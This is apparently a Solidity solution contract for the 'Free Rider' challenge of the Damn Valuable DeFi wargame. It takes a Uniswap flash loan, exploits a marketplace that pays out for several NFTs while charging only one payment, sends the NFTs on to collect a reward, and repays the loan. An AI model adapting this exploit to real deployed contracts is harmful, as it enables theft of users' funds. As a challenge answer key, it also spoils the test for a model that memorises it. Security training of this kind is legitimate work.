// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity >=0.5.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";
import "../DamnValuableNFT.sol";
import "hardhat/console.sol";

interface IWETH {
    function deposit() external payable;

    function transfer(address to, uint256 value) external returns (bool);

    function withdraw(uint256) external;

    function balanceOf(address) external returns (uint256);
}

// 1) Get a flash loan of 15 ETH from Uniswap
// 2) Pay 15 ETH to get all 6 NFTs
// 3) Send all 6 NFTs to the Buyer's contract
// 4) Get 45 ETH reward
// 5) Pay back 15 ETH + fee for the flash loan

contract FreeRiderSolver is IUniswapV2Callee, Ownable, ReentrancyGuard, IERC721Receiver {
    using SafeMath for uint256;

    FreeRiderNFTMarketplace private immutable i_nftMarketplace;
    FreeRiderBuyer i_buyer;
    IUniswapV2Pair i_uniswapPair; // WETH/DVT Pair
    IWETH immutable i_weth;
    DamnValuableNFT immutable i_nftToken;

    constructor(
        address payable nftMarketplace,
        address buyer,
        address uniswapPair
    ) {
        i_nftMarketplace = FreeRiderNFTMarketplace(nftMarketplace);
        i_buyer = FreeRiderBuyer(buyer);
        i_uniswapPair = IUniswapV2Pair(uniswapPair);
        i_weth = IWETH(i_uniswapPair.token0());
        i_nftToken = DamnValuableNFT(FreeRiderNFTMarketplace(nftMarketplace).token());
    }

    receive() external payable {}

    function attack(uint256 nftPrice) external onlyOwner {
        // Convert our ETH to WETH
        // We have no use for callData, so just send 1 to trigger the callback
        bytes memory callData = "1";
        i_uniswapPair.swap(nftPrice, 0, address(this), callData);
    }

    function depositAndConvertToWeth() external payable {
        i_weth.deposit{value: msg.value}();
    }

    function withdrawEth() external onlyOwner {
        convertAllWethToEth();
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        assert(success);
    }

    function uniswapV2Call(
        address, /* sender */
        uint256 amount0,
        uint256 amount1,
        bytes calldata
    ) external override {
        uint256 amountETH;
        {
            assert(msg.sender == address(i_uniswapPair)); // ensure that msg.sender is actually a V2 pair
            assert(amount0 == 0 || amount1 == 0); // this strategy is unidirectional
            amountETH = amount0;
        }

        uint256 wethBalance = i_weth.balanceOf(address(this));
        console.log("WETH Balance = %i", wethBalance);

        convertAllWethToEth();
        buyAllNfts(amount0);
        console.log("ETH Balance = %i", address(this).balance);
        sendNftsToBuyer();

        uint256 amountRequired = (amountETH.mul(1000) / 997).add(1);
        i_weth.deposit{value: amountRequired}();
        console.log("amountRequired = %i", amountRequired);
        assert(i_weth.transfer(msg.sender, amountRequired)); // return tokens to V2 pair
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external override nonReentrant returns (bytes4) {
        require(msg.sender == address(i_nftToken));
        return IERC721Receiver.onERC721Received.selector;
    }

    function sendNftsToBuyer() internal {
        uint256[] memory tokenIds = getTokenIdList();
        for (uint256 i = 0; i < tokenIds.length; i++) {
            i_nftToken.safeTransferFrom(address(this), address(i_buyer), tokenIds[i]);
        }
    }

    function buyAllNfts(uint256 nftPrice) internal {
        i_nftMarketplace.buyMany{value: nftPrice}(getTokenIdList());
    }

    function convertAllWethToEth() internal {
        i_weth.withdraw(i_weth.balanceOf(address(this)));
    }

    function getTokenIdList() internal pure returns (uint256[] memory tokenIds) {
        tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
    }
}
